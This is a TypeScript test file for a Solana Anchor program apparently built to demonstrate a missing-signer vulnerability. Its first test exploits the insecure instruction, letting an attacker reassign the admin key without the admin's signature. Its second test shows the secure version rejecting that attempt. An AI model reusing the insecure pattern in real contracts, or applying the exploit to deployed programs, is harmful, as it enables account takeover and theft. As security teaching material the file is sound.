import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { VulnMissingSigner } from "../target/types/vuln_missing_signer";
import { expect } from "chai";

describe("vuln_missing_signer", () => {
  anchor.setProvider(anchor.AnchorProvider.env());
  const program = anchor.workspace.VulnMissingSigner as Program<VulnMissingSigner>;
  const provider = anchor.getProvider();

  it("Exploits missing signer check!", async () => {
    const state = anchor.web3.Keypair.generate();
    const admin = anchor.web3.Keypair.generate();
    const attacker = anchor.web3.Keypair.generate();

    // Initialize the state
    await program.methods
      .initializeInsecure()
      .accounts({
        state: state.publicKey,
        admin: admin.publicKey,
        payer: provider.publicKey,
      })
      .signers([state])
      .rpc();

    let stateAccount = await program.account.adminState.fetch(state.publicKey);
    expect(stateAccount.admin.toBase58()).to.equal(admin.publicKey.toBase58());

    // Attacker updates admin WITHOUT admin's signature
    const newAdmin = attacker.publicKey;
    await program.methods
      .updateAdminInsecure(newAdmin)
      .accounts({
        state: state.publicKey,
        admin: admin.publicKey, // We just pass the pubkey, no signature requested by program
      })
      .rpc();

    stateAccount = await program.account.adminState.fetch(state.publicKey);
    expect(stateAccount.admin.toBase58()).to.equal(newAdmin.toBase58());
  });

  it("Fails to update admin when signer is required (Secure)", async () => {
    const state = anchor.web3.Keypair.generate();
    const admin = anchor.web3.Keypair.generate();
    const attacker = anchor.web3.Keypair.generate();

    await program.methods
      .initializeSecure()
      .accounts({
        state: state.publicKey,
        admin: admin.publicKey,
        payer: provider.publicKey,
      })
      .signers([state, admin])
      .rpc();

    try {
      await program.methods
        .updateAdminSecure(attacker.publicKey)
        .accounts({
          state: state.publicKey,
          admin: admin.publicKey,
        })
        // This will fail because Anchor expects 'admin' to be a signer
        .rpc();
      expect.fail("Should have failed because admin is not a signer");
    } catch (e) {
        // Expected
    }
  });
});
